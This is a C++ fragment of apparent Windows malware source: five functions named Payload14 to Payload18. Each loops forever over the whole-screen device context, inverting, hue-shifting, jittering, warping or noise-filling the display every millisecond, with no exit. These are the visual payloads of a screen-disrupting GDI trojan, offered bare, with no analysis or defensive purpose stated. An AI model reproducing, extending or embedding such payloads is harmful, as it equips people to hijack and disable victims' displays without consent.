DWORD WINAPI Payload14(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), rndsize2 = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i * 4) ^ (y ^ i * 4);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx + x / 50.f + y / h * .1f, 0.95f);
                hslcolor.s += 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int y1 = 0; y1 < h; y1 += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, y1, w, rndsize, hcdc, 0, y1, w, rndsize, SRCAND);
        }
        for (int y2 = 0; y2 < h; y2 += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, y2, w, rndsize, hcdc, 0, y2, w, rndsize, SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload15(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), rndsize1 = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        for (int x = 0; x < w; x += rndsize) {
            StretchBlt(hcdc, x, -5 + rand() % 11, rndsize, h, hcdc, x, 0, rndsize, h, SRCAND);
        }
        for (int x = 0; x < w; x += rndsize1) {
            StretchBlt(hcdc, x, -5 + rand() % 11, rndsize1, h, hcdc, x, 0, rndsize1, h, SRCPAINT);
        }
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = (int)((i ^ 5) + (i * 5) * cbrt(i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload16(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = ((i ^ 8) + (i * 8) * ((x & y) + (x ^ y) * i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 500, 1.f);
                hslcolor.s += 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload17(LPVOID lpParam) {
    PRGBTRIPLE rgbtriple; int xxx = 0; POINT point[3];
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), increment = 1 + rand() % 20, rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, t = (x ^ y);
            rgbtriple[i].rgbtRed += t + x + xxx;
            rgbtriple[i].rgbtGreen ^= t + (x | y) + i + xxx;
            rgbtriple[i].rgbtBlue += t + y + xxx;
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        if (rand() % 10 >= 5) {
            point[0].x = increment; point[0].y = -increment;
            point[1].x = w + increment; point[1].y = increment;
            point[2].x = -increment; point[2].y = h - increment;
        }
        else {
            point[0].x = -increment; point[0].y = increment;
            point[1].x = w - increment; point[1].y = -increment;
            point[2].x = increment; point[2].y = h + increment;
        }
        PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hcdc, rand() % 20, rand() % 20, w, h, hcdc, rand() % 20, rand() % 20, SRCPAINT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx += 5;
    }
}

DWORD WINAPI Payload18(LPVOID lpParam) {
    srand(time(NULL));
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        PRGBQUAD rgbScreen = { 0 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int luckynum = rand() % 30;
            if (luckynum <= 10) { rgbScreen[i].rgb = 0; }
            else if (luckynum > 10 && luckynum <= 20) { rgbScreen[i].rgb = 7237230; }
            else { rgbScreen[i].rgb = 14474460; }
        }
        for (int x = 0; x < w; x += 50) {
            for (int y = 0; y < h; y += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 15, 15, SRCCOPY);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}